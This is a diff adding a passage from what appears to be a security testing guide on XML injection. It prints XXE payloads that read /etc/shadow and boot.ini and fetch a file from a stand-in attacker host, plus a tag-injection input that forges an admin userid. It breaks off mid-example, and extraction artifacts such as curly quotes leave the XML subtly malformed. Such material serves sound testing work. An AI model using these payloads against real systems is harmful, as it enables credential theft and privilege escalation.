@@ -1,0 +1,41 @@
+METHOD / ANSWER:
+foo>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM “file:/etc/shadow” >]><foo>&xxe;</
+foo>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM “file:/c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM “http:/www.attacker.com/text.txt”
+>]><foo>&xxe;</foo>
+Tag Injection
+Once the first step is accomplished, the tester will have some infor-
+mation about the structure of the XML document. Then, it is possible
+to try to inject XML data and tags. We will show an example of how
+this can lead to a privilege escalation attack.
+Let's considering the previous application. By inserting the following
+values:
+Username: tony
+Password: Un6R34kb!le
+E-mail: s4tan@hell.com</mail><userid>O</userid><-
+mail>s4tan@hell.com
+the application will build
+a new node and append it to the XML data-
+base:
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<users>
+<user>
+<username>gandalf</username>
+<password>!c3</password>
+<userid>O</userid>
+<mail>gandalf@middleearth.com</mail>
+</user>
+<user>
+<username>Stefan0</username>
+<p
